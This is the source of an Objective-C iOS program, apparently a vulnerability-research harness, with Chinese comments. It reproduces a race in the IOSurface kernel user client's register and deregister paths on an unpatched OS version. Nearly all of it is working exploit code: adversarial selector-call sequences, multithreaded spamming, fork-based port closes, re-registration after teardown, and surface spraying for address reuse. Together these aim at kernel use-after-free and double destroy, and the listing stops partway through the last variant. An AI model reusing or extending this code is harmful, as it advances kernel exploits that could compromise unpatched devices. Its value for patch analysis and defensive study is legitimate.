// israce — IOSurface 生命周期竞态复现器（`obj+0xf1` 守卫线）
//
// 静态结论（out/IOSURFACE-RACE.md）：27.2 在 IOSurface 客户端的注销路径
//   #802 = 0xfffffe000a394744 / 27.0.1 = 0xfffffe000a346364
// 里置 [obj+0xf1]=1，注册路径
//   #799 = 0xfffffe000a3944c0 / 27.0.1 = 0xfffffe000a3460f0
// 里检查它，命中返回 kIOReturnNotAttached(0xE00002D8)。
// [obj+0xf0] bit0 = 「本客户端已挂进 root 注册表」；注销先清它，再摘链。
// 27.0.1 没有 +0xf1 ⇒「注销之后又注册回来」被完全放行。
//
// 本程序驱动对抗性顺序，找 27.0.1 上的 panic / 内核状态破坏。
//
// 输出 tmp/israce.ndjson：每用例两行 begin / end。panic 会留下「有 begin 无 end」
// 的唯一指纹，重启后精确指认触发用例。逐行 fflush，支持按 key 断点续跑。
//
// 构建/安装/取数据见 build.sh / run.sh。

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <Metal/Metal.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <dlfcn.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/time.h>

// ---------------- 常量（静态分析得来） ----------------
#define SEL_REG      17   // 0xa3498f4 -> #799 注册。structIn=24, 其余 0
#define SEL_DEREG    18   // 0xa34991c -> 0xa3461f4 按 (key,self) 摘链+destroy+free。structIn=24
#define KIORETURN_NOTATTACHED 0xE00002D8u
#define KIORETURN_INTERNAL    0xE00002C9u

static const double kStartBudget = 22.0;   // 超过此秒数不再发起新用例
static const double kWatchdog    = 27.0;   // 硬收尾

// ---------------- 全局 ----------------
static NSString *gTmp = nil;
static FILE *gNd = NULL;
static FILE *gLog = NULL;
static pthread_mutex_t gMx = PTHREAD_MUTEX_INITIALIZER;
static double gT0 = 0;
static volatile int gFinished = 0;
static volatile int gStop = 0;
static int gRan = 0, gEnds = 0, gSkips = 0, gOK = 0;
static int gCalib = -1;              // 校准出的调用形态
static NSMutableSet *gDone = nil;    // 已有 end 的 key

static void initClock(void) {
    struct timeval tv; gettimeofday(&tv, NULL);
    gT0 = (double)tv.tv_sec + tv.tv_usec / 1e6;
}
static double nowSec(void) {
    struct timeval tv; gettimeofday(&tv, NULL);
    return (double)tv.tv_sec + tv.tv_usec / 1e6 - gT0;
}
static uint64_t nowNs(void) {
    struct timeval tv; gettimeofday(&tv, NULL);
    return (uint64_t)tv.tv_sec * 1000000000ull + (uint64_t)tv.tv_usec * 1000ull;
}
static void sleepUs(long us) { if (us > 0) usleep((useconds_t)us); }

static void L(NSString *fmt, ...) {
    if (!gLog) return;
    va_list a; va_start(a, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:a];
    va_end(a);
    pthread_mutex_lock(&gMx);
    fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog);
    pthread_mutex_unlock(&gMx);
}

// 一行 ndjson
static void ND(NSString *s) {
    if (!gNd) return;
    pthread_mutex_lock(&gMx);
    fprintf(gNd, "%s\n", s.UTF8String);
    fflush(gNd);
    fsync(fileno(gNd));          // panic 不丢行：每次落盘
    pthread_mutex_unlock(&gMx);
}

static void beginCase(NSString *k, NSString *meta) {
    ND([NSString stringWithFormat:
        @"{\"k\":\"%@\",\"ph\":\"begin\",\"t\":%.3f%@}",
        k, nowSec(), meta.length ? meta : @""]);
}
static void endCase(NSString *k, NSString *fields) {
    ND([NSString stringWithFormat:
        @"{\"k\":\"%@\",\"ph\":\"end\",\"t\":%.3f%@}",
        k, nowSec(), fields.length ? fields : @""]);
    gEnds++;
}
// 不占位的事件行：校准、连接建立等
static void noteEvent(NSString *ev, NSString *fields) {
    ND([NSString stringWithFormat:
        @"{\"k\":\"@%@\",\"ph\":\"note\",\"t\":%.3f%@}",
        ev, nowSec(), fields.length ? fields : @""]);
}

// ---------------- 返回码名 ----------------
static const char *rcName(uint32_t v) {
    switch (v) {
        case 0: return "SUCCESS";
        case 0xE00002BC: return "kIOReturnError";
        case 0xE00002BD: return "kIOReturnNoMemory";
        case 0xE00002BE: return "kIOReturnNoResources";
        case 0xE00002C0: return "kIOReturnNoDevice";
        case 0xE00002C1: return "kIOReturnNotPrivileged";
        case 0xE00002C2: return "kIOReturnBadArgument";
        case 0xE00002C7: return "kIOReturnUnsupported";
        case 0xE00002C9: return "kIOReturnInternalError";
        case 0xE00002CC: return "kIOReturnNotOpen";
        case 0xE00002CD: return "kIOReturnNotReadable";
        case 0xE00002CE: return "kIOReturnNotWritable";
        case 0xE00002D6: return "kIOReturnOffline";
        case 0xE00002D8: return "kIOReturnNotAttached";
        case 0xE00002E2: return "kIOReturnNotPermitted";
        case 0xE00002EB: return "kIOReturnAborted";
        case 0x10000003: return "MIG_BAD_ARGUMENTS";
        default: return "?";
    }
}

// ---------------- IOSurface 私有 API（dlsym，避免 SDK 头/链接差异） ----------------
typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pCreate)(CFDictionaryRef);
static IOSurfaceRef_ (*pLookup)(uint32_t);
static uint32_t       (*pGetID)(IOSurfaceRef_);
static kern_return_t  (*pLock)(IOSurfaceRef_, uint32_t, uint32_t *);
static kern_return_t  (*pUnlock)(IOSurfaceRef_, uint32_t, uint32_t *);

static void loadIOSurface(void) {
    const char *paths[] = {
        "/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
        "/System/Library/Frameworks/IOSurface.framework/IOSurface",
        NULL
    };
    void *h = NULL;
    for (int i = 0; paths[i] && !h; i++) h = dlopen(paths[i], RTLD_LAZY);
    if (!h) { L(@"dlopen IOSurface 失败: %s", dlerror()); return; }
    pCreate  = (void *)dlsym(h, "IOSurfaceCreate");
    pLookup  = (void *)dlsym(h, "IOSurfaceLookup");
    pGetID   = (void *)dlsym(h, "IOSurfaceGetID");
    pLock    = (void *)dlsym(h, "IOSurfaceLock");
    pUnlock  = (void *)dlsym(h, "IOSurfaceUnlock");
    L(@"IOSurface 符号: create=%d lookup=%d getID=%d lock=%d unlock=%d",
      !!pCreate, !!pLookup, !!pGetID, !!pLock, !!pUnlock);
}

static IOSurfaceRef_ mkSurface(void) {
    if (!pCreate) return NULL;
    int w = 64, h = 4;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    int bpe = 4, pf = 0x42475241; // 'BGRA'
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *vv[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4,
                                           &kCFTypeDictionaryKeyCallBacks,
                                           &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef_ s = pCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

// ---------------- IOKit 连接 ----------------
static io_service_t gSvc = 0;

static int openConn(io_connect_t *out) {
    return IOServiceOpen(gSvc, mach_task_self(), 0, out);
}

// selector 调用形态：handler 读 args+0x10 必须非 0（否则 BadArgument）、
// args+0x30 是 structureInput（structIn=24）。四种形态都试，取返回 KERN_SUCCESS 的。
static kern_return_t callSel(io_connect_t c, uint32_t sel, uint64_t *in3,
                             size_t inSz, int shape, uint64_t *unused) {
    (void)unused;
    uint64_t buf[3] = { 0, 0, 0 };
    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
    uint64_t ref  = 0x1122334455667788ull;
    uint64_t zero = 0;
    uint32_t soc  = 0;
    // shape 0 = 同步（对照，实测恒 BadArgument）
    // shape 1 = async，reference 数组 1 项且非 0  -> args+0x10 != 0，注册可过门
    // shape 2 = async，reference 数组 1 项但为 0
    // shape 3 = async，referenceCnt 0（reference == NULL）
    if (shape == 0)
        return IOConnectCallMethod(c, sel, NULL, 0, buf, inSz, NULL, NULL, NULL, NULL);

    mach_port_t wp = MACH_PORT_NULL;
    mach_port_t self = mach_task_self();
    if (mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &wp) != KERN_SUCCESS)
        return KERN_RESOURCE_SHORTAGE;
    kern_return_t kr;
    if (shape == 1)
        kr = IOConnectCallAsyncMethod(c, sel, wp, &ref, 1, NULL, 0, buf, inSz,
                                      NULL, &soc, NULL, NULL);
    else if (shape == 2)
        kr = IOConnectCallAsyncMethod(c, sel, wp, &zero, 1, NULL, 0, buf, inSz,
                                      NULL, &soc, NULL, NULL);
    else
        kr = IOConnectCallAsyncMethod(c, sel, wp, NULL, 0, NULL, 0, buf, inSz,
                                      NULL, &soc, NULL, NULL);
    mach_port_mod_refs(self, wp, MACH_PORT_RIGHT_RECEIVE, -1);
    return kr;
}

// 校准：找让 SEL_REG 返回 SUCCESS 的形态
static int calibrate(void) {
    uint64_t in[3] = { 1, 2, 3 };
    int best = -1;
    for (int shape = 0; shape < 4; shape++) {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { L(@"校准：IOServiceOpen 失败"); return -1; }
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, NULL);
        L(@"calib sel17 shape=%d -> 0x%x %s", shape, (uint32_t)r, rcName((uint32_t)r));
        noteEvent(@"calib", [NSString stringWithFormat:
            @",\"shape\":%d,\"rc\":%u,\"rcn\":\"%s\"",
            shape, (uint32_t)r, rcName((uint32_t)r)]);
        if (r == KERN_SUCCESS && best < 0) best = shape;
        IOServiceClose(c);
    }
    {   // sel18 对照：只读 structureInput(args+0x30)，同步即可
        io_connect_t c = 0;
        if (openConn(&c) == KERN_SUCCESS) {
            uint32_t r = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, NULL);
            L(@"calib sel18 sync -> 0x%x %s", r, rcName(r));
            noteEvent(@"calib18", [NSString stringWithFormat:
                @",\"rc\":%u,\"rcn\":\"%s\"", r, rcName(r)]);
            IOServiceClose(c);
        }
    }
    L(@"校准结果 shape=%d", best);
    return best;
}

// ---------------- 用例表 ----------------
typedef struct { const char *k; int n; } Case;

// 变体说明见 out/IOSURFACE-RACE.md 的复现矩阵
enum {
    V_BASELINE = 0,   // 单次注册
    V_DOUBLE   = 1,   // 注册 x2
    V_SEQ1817  = 2,   // 注册 → sel18 注销 → 再注册（非竞态状态机）
    V_RACE1    = 10,  // 1 conn，多线程灌 sel17，主线程 close
    V_RACE8    = 11,  // 8 conn 同时注册 + 交错 close
    V_FORKCL   = 12,  // 子进程 IOServiceClose，父进程灌 sel17
    V_FORKEXIT = 13,  // 子进程退出释放端口权，父进程灌 sel17
    V_SURFCH   = 14,  // sel17 灌 + IOSurface create/lookup/release churn
    V_LOCKDEG  = 15,  // IOSurfaceLock 进行中被 deregister（close root conn）
    V_BIG      = 16,  // 64 surface + 8 conn 交错
    V_DEREG18  = 17,  // sel18 注销 + 并发 sel17（跨线程状态机竞态）
    V_POSTCLOSE2 = 18, // 两个额外 uref，连续两次 IOServiceClose 后再注册
    V_ADDRREUSE  = 19, // 留残留节点 -> 批量新客户端复用地址 -> 逐个关闭
    V_MINI       = 20, // ★ 最小序列：一次迭代，无线程、无抖动，nsurf = 顺序模式 0..4
    V_SPRAY      = 21, // ★ 回收控制：nsurf 个同尺寸 surface 大面积喷射
    V_LOCKLITE   = 22, // 1 个 lock 线程、零 sleep：看 4 线程/抖动是不是噪声
    V_METAL      = 29, // ★ 轮3：种雷 + Metal 提交真实 GPU 工作 + 拆除
    V_REPLANT2   = 28, // ★ 重注册 + close + 双引用倒序释放（主实验）
    V_SEQ4       = 27, // ★ 四步诊断：sel17 / sel17 / sel18(同步,0标量,24B) / sel17
    V_SELPROBE   = 26, // ★ 实测扫描 selector 15..22，找出真正的注销号
    V_REPLANT    = 25, // ★ 三步：注册 → 注销 → 再注册（对上 27.2 的 +0xf1 补丁语义）
    V_DUALREF    = 24, // ★ 双引用 + 倒序释放：最后一个引用归零时才走释放链遍历
};

static volatile int gSpamRun = 0;
static io_connect_t gSpamConn = 0;
static volatile uint64_t gSpamCount = 0;
static int gCalibShape = 0;

static void *spamSel17(void *arg) {
    (void)arg;
    io_connect_t c = gSpamConn;
    uint64_t in[3] = { 1, 2, 3 };
    while (gSpamRun) {
        callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
        __sync_fetch_and_add(&gSpamCount, 1);
    }
    return NULL;
}

static void *spamLock(void *arg) {
    IOSurfaceRef_ s = (IOSurfaceRef_)arg;
    uint32_t seed = 0;
    while (gSpamRun) {
        if (pLock)   pLock(s, 0, &seed);
        if (pUnlock) pUnlock(s, 0, &seed);
        __sync_fetch_and_add(&gSpamCount, 1);
    }
    return NULL;
}

// 起 n 个灌线程
static int startSpam(pthread_t *th, int n, void *(*fn)(void *), void *arg, io_connect_t conn) {
    gSpamRun = 1; gSpamConn = conn; gSpamCount = 0;
    for (int i = 0; i < n; i++) pthread_create(&th[i], NULL, fn, arg);
    return n;
}
static void stopSpam(pthread_t *th, int n) {
    gSpamRun = 0;
    for (int i = 0; i < n; i++) pthread_join(th[i], NULL);
}

// ---------------- 各变体 ----------------
static int runCase(int variant, int nsurf, int iter, NSString *key)
{
    uint64_t in[3] = { 1, 2, 3 };
    uint64_t so[3] = { 0, 0, 0 };
    uint64_t t0 = nowNs();
    int  rc = -1;
    uint32_t rcs[8] = {0};
    int nrc = 0;

    switch (variant) {
    case V_BASELINE: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        kern_return_t r = callSel(c, SEL_REG, in, 24, gCalibShape, so);
        rcs[0] = (uint32_t)r; nrc = 1;
        IOServiceClose(c);
        break;
    }
    case V_DOUBLE: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, so); nrc = 1;
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, so); nrc = 2;
        IOServiceClose(c);
        break;
    }
    case V_SEQ1817: {
        // ★ 核心：加一个额外 uref，让端口名在 IOServiceClose 之后仍然可用，
        //   于是「注销之后又注册」被直接触发，完全不需要竞态。
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);  // 挂进表
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);  // 重复 -> 0xC9
        IOServiceClose(c);                                                  // teardown: #802 摘链
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);  // ★ 注销后再注册
        rcs[3] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);  // 再来一次
        nrc = 4;
        mach_port_deallocate(mach_task_self(), c);
        break;
    }
    case V_DEREG18: {
        // 同一 conn 上：线程 A 灌 sel17，主线程打 sel18 注销
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        pthread_t th[6];
        int n = startSpam(th, 6, spamSel17, NULL, c);
        sleepUs(200 + (iter % 40) * 25);
        uint32_t nrc2 = 0;
        uint32_t r2 = (uint32_t)callSel(c, SEL_DEREG, in, 24, gCalibShape, so);
        for (int i = 0; i < 6; i++) {
            r2 = (uint32_t)callSel(c, SEL_DEREG, in, 24, gCalibShape, so);
            nrc2 = r2;
        }
        stopSpam(th, n);
        rcs[0] = nrc2; nrc = 1;
        IOServiceClose(c);
        break;
    }
    case V_RACE1: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);     // 先挂进表
        pthread_t th[6];
        int n = startSpam(th, 6, spamSel17, NULL, c);
        sleepUs(150 + (iter % 50) * 20);                  // 抖动 150..1130us
        IOServiceClose(c);                                // 触发 teardown (#802)
        sleepUs(800);
        stopSpam(th, n);
        break;
    }
    case V_RACE8: {
        io_connect_t c[8]; int have[8]; int m = 0;
        for (int i = 0; i < 8; i++) {
            have[i] = (openConn(&c[i]) == KERN_SUCCESS);
            if (have[i]) { callSel(c[i], SEL_REG, in, 24, gCalibShape, so); m++; }
            else c[i] = 0;
        }
        if (!m) { rc = -100; break; }
        pthread_t th[16];
        gSpamRun = 1; gSpamConn = c[0]; gSpamCount = 0;
        for (int i = 0; i < 16; i++) pthread_create(&th[i], NULL, spamSel17, NULL);
        // 交错 close：越乱越好
        for (int r = 0; r < 3; r++)
            for (int i = 0; i < 8; i++) {
                int j = (i * 5 + r * 3) % 8;
                if (have[j]) { IOServiceClose(c[j]); have[j] = 0; }
                sleepUs(20 + (iter % 10) * 7);
            }
        gSpamRun = 0;
        for (int i = 0; i < 16; i++) pthread_join(th[i], NULL);
        for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(c[i]);
        break;
    }
    case V_FORKCL: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        pthread_t th[4];
        int n = startSpam(th, 4, spamSel17, NULL, c);
        pid_t pid = fork();
        if (pid == 0) {
            // 子进程：同一端口，直接 IOServiceClose —— 对同一个 user client 对象下手
            sleepUs(200 + (iter % 40) * 25);
            IOServiceClose(c);
            _exit(0);
        }
        if (pid < 0) { stopSpam(th, n); IOServiceClose(c); rc = -101; break; }
        int st = 0; waitpid(pid, &st, 0);
        sleepUs(500);
        stopSpam(th, n);
        IOServiceClose(c);
        break;
    }
    case V_FORKEXIT: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        pthread_t th[4];
        int n = startSpam(th, 4, spamSel17, NULL, c);
        pid_t pid = fork();
        if (pid == 0) {
            sleepUs(200 + (iter % 40) * 25);
            _exit(0);             // 不 close，直接退出 → 端口权销毁
        }
        if (pid < 0) { stopSpam(th, n); IOServiceClose(c); rc = -101; break; }
        int st = 0; waitpid(pid, &st, 0);
        sleepUs(300);
        stopSpam(th, n);
        IOServiceClose(c);
        break;
    }
    case V_SURFCH: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        pthread_t th[4];
        int n = startSpam(th, 4, spamSel17, NULL, c);
        for (int i = 0; i < 8; i++) {
            IOSurfaceRef_ s = mkSurface();
            if (s) { if (pGetID) (void)pGetID(s); CFRelease(s); }
            if (pLookup) {
                IOSurfaceRef_ l = pLookup((uint32_t)(0x100 + i));
                if (l) CFRelease(l);
            }
        }
        sleepUs(200 + (iter % 30) * 25);
        IOServiceClose(c);
        sleepUs(500);
        stopSpam(th, n);
        break;
    }
    case V_DUALREF: {
        // 双引用 + 倒序释放：最后一个引用归零时才走释放链遍历（0xa3338cc -> 0xa3462f0）
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); rc = -102; break; }
        uint32_t gid = pGetID ? (uint32_t)(uintptr_t)pGetID(s) : 0;
        IOSurfaceRef_ s2 = pLookup ? pLookup(gid) : NULL;
        rcs[0] = s2 ? 1 : 0;          // lookup 是否返回非 NULL
        rcs[1] = gid;                  // gid 是否 sane
        nrc = 2;
        IOServiceClose(c);             // teardown 先走完
        sleepUs(20000);
        CFRelease(s);                  // 减一，不归零 -> 遍历不发生
        sleepUs(200000);               // 200ms
        if (s2) CFRelease(s2);         // ★ 归零 -> 释放链遍历在此刻跑
        break;
    }
    case V_REPLANT: {
        // 注册 -> 注销 -> 再注册。27.0.1 无人检查「已注销」，27.2 用 +0xf1 挡。
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG,   in, 24, gCalibShape, so);  // 1 注册
        rcs[1] = (uint32_t)callSel(c, SEL_DEREG, in, 24, gCalibShape, so);  // 2 注销
        rcs[2] = (uint32_t)callSel(c, SEL_REG,   in, 24, gCalibShape, so);  // 3 ★ 再注册
        nrc = 3;
        if (rcs[2] == 0) {
            // 种上了：立刻做一次释放链遍历（第二引用倒序释放）
            IOSurfaceRef_ s = mkSurface();
            if (s) {
                uint32_t gid = pGetID ? (uint32_t)(uintptr_t)pGetID(s) : 0;
                IOSurfaceRef_ s2 = pLookup ? pLookup(gid) : NULL;
                IOServiceClose(c);
                sleepUs(20000);
                CFRelease(s);
                sleepUs(200000);
                if (s2) CFRelease(s2);
                break;
            }
        }
        IOServiceClose(c);
        break;
    }
    case V_SELPROBE: {
        // 先注册，再用同一 args 逐个试 15..22，看哪个返回 SUCCESS（=真正的注销）
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
        int k = 1;
        for (int sel = 15; sel <= 22; sel++) rcs[k++] = (uint32_t)callSel(c, sel, in, 24, gCalibShape, NULL);
        nrc = k;
        IOServiceClose(c);
        break;
    }
    case V_SEQ4: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 1 注册
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 2 必须 0xC9
        uint64_t buf[3] = { in[0], in[1], in[2] };
        // sel18：同步、0 标量、精确 24 字节 structureInput、无输出
        rcs[2] = (uint32_t)IOConnectCallMethod(c, 18, NULL, 0, buf, 24, NULL, NULL, NULL, NULL);
        rcs[3] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 4
        nrc = 4;
        IOServiceClose(c);
        break;
    }
    case V_REPLANT2: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 注册
        uint64_t b3[3] = { in[0], in[1], in[2] };
        rcs[1] = (uint32_t)IOConnectCallMethod(c, 18, NULL, 0, b3, 24, NULL, NULL, NULL, NULL); // 注销(同步)
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 再注册
        nrc = 5;
        IOSurfaceRef_ s = mkSurface();
        uint32_t gid = 0; IOSurfaceRef_ s2 = NULL;
        if (s) { gid = pGetID ? (uint32_t)(uintptr_t)pGetID(s) : 0; s2 = pLookup ? pLookup(gid) : NULL; }
        rcs[3] = s2 ? 1 : 0;   // ★ lookup 是否返回非空（倒序释放是否真有两个引用）
        rcs[4] = gid;
        IOServiceClose(c);                 // ★ client 被释放，节点仍指向它
        sleepUs(20000);
        if (s) CFRelease(s);
        sleepUs(200000);
        if (s2) CFRelease(s2);             // 触发释放链遍历
        break;
    }
    case V_METAL: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 注册
        uint64_t b3[3] = { in[0], in[1], in[2] };
        rcs[1] = (uint32_t)IOConnectCallMethod(c, 18, NULL, 0, b3, 24, NULL, NULL, NULL, NULL); // 注销
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL);   // 再注册
        IOSurfaceRef_ s = mkSurface();
        uint32_t gid = 0; IOSurfaceRef_ s2 = NULL;
        if (s) { gid = pGetID ? (uint32_t)(uintptr_t)pGetID(s) : 0; s2 = pLookup ? pLookup(gid) : NULL; }
        @autoreleasepool {
            id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
            rcs[3] = dev ? 1 : 0;                       // dev 非空
            rcs[4] = 0; rcs[5] = 0;
            if (dev && s) {
                MTLTextureDescriptor *d = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm width:64 height:4 mipmapped:NO];
                d.usage = MTLTextureUsageShaderRead | MTLTextureUsageShaderWrite | MTLTextureUsageRenderTarget;
                id<MTLTexture> tex = [dev newTextureWithDescriptor:d iosurface:(IOSurfaceRef)s plane:0];
                rcs[4] = tex ? 1 : 0;                   // tex 非空
                if (tex) {
                    MTLTextureDescriptor *d2 = [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm width:64 height:4 mipmapped:NO];
                    d2.usage = MTLTextureUsageShaderRead | MTLTextureUsageShaderWrite | MTLTextureUsageRenderTarget;
                    id<MTLTexture> tex2 = [dev newTextureWithDescriptor:d2];
                    rcs[5] = tex2 ? 1 : 0;
                    if (tex2) {
                        id<MTLCommandQueue> q = [dev newCommandQueue];
                        id<MTLCommandBuffer> cb = [q commandBuffer];
                        id<MTLBlitCommandEncoder> bl = [cb blitCommandEncoder];
                        if (bl) {
                            [bl copyFromTexture:tex sourceSlice:0 sourceLevel:0
                                  sourceOrigin:MTLOriginMake(0,0,0) sourceSize:MTLSizeMake(64,4,1)
                                       toTexture:tex2 destinationSlice:0 destinationLevel:0
                              destinationOrigin:MTLOriginMake(0,0,0)];
                            [bl endEncoding];
                        }
                        [cb commit];
                        [cb waitUntilCompleted];
                        rcs[6] = (uint32_t)[cb status];   // 4 = Completed
                    }
                }
            }
        }
        rcs[7] = gid;
        nrc = 8;
        IOServiceClose(c);              // client 释放，节点仍指向它
        sleepUs(20000);
        if (s) CFRelease(s);
        sleepUs(200000);
        if (s2) CFRelease(s2);          // 归零释放
        break;
    }
    case V_LOCKDEG: {
        // 每个内核调用前落一个 mark（fsync），卡死时最后一条 mark 就是卡住的调用
        #define MK(x) do { } while (0)   // 12:33 加过 fsync 级 mark，已确认为时序混杂因素，默认关闭
        MK("open");
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        MK("reg");
        callSel(c, SEL_REG, in, 24, gCalibShape, so);
        MK("create");
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); rc = -102; break; }
        MK("spam");
        pthread_t th[4];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0;
        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
        sleepUs(200 + (iter % 40) * 25);
        MK("close");
        IOServiceClose(c);
        sleepUs(400);
        gSpamRun = 0;
        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
        MK("release");
        CFRelease(s);
        #undef MK
        break;
    }
    case V_BIG: {
        int N = nsurf > 0 ? nsurf : 64;
        IOSurfaceRef_ surf[64]; int haveS = 0;
        for (int i = 0; i < N && i < 64; i++) { surf[i] = mkSurface(); if (surf[i]) haveS++; }
        io_connect_t c[8]; int have[8]; int m = 0;
        for (int i = 0; i < 8; i++) {
            have[i] = (openConn(&c[i]) == KERN_SUCCESS);
            if (have[i]) { callSel(c[i], SEL_REG, in, 24, gCalibShape, so); m++; }
            else c[i] = 0;
        }
        pthread_t th[12];
        gSpamRun = 1; gSpamConn = have[0] ? c[0] : 0; gSpamCount = 0;
        for (int i = 0; i < 12; i++) pthread_create(&th[i], NULL, spamSel17, NULL);
        for (int i = 0; i < 8; i++) { if (have[7-i]) { IOServiceClose(c[7-i]); have[7-i] = 0; } sleepUs(30); }
        for (int i = 0; i < N && i < 64; i++) if (surf[i]) CFRelease(surf[i]);
        gSpamRun = 0;
        for (int i = 0; i < 12; i++) pthread_join(th[i], NULL);
        for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(c[i]);
        (void)haveS; (void)m;
        break;
    }
    case V_POSTCLOSE2: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +2);
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL); nrc = 1;
        IOServiceClose(c);
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL); nrc = 2;
        IOServiceClose(c);
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL); nrc = 3;
        rcs[3] = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, NULL);         nrc = 4;
        rcs[4] = (uint32_t)callSel(c, SEL_REG, in, 24, gCalibShape, NULL); nrc = 5;
        mach_port_deallocate(mach_task_self(), c);
        break;
    }
    case V_ADDRREUSE: {
        // 关掉 A 后留下「注销后又注册」的残留节点；再连开一批新客户端去复用 A 的地址，
        // 然后逐个关闭，让 #802 按 node+0x58 命中残留节点 -> 二次 destroy(node+0x10)。
        io_connect_t a = 0;
        if (openConn(&a) != KERN_SUCCESS) { rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), a, MACH_PORT_RIGHT_SEND, +1);
        callSel(a, SEL_REG, in, 24, gCalibShape, NULL);
        IOServiceClose(a);
        rcs[0] = (uint32_t)callSel(a, SEL_REG, in, 24, gCalibShape, NULL); nrc = 1;
        mach_port_deallocate(mach_task_self(), a);
        int N = (nsurf > 0 && nsurf <= 64) ? nsurf : 24;
        io_connect_t cs[64]; int have[64];
        for (int i2 = 0; i2 < N; i2++) {
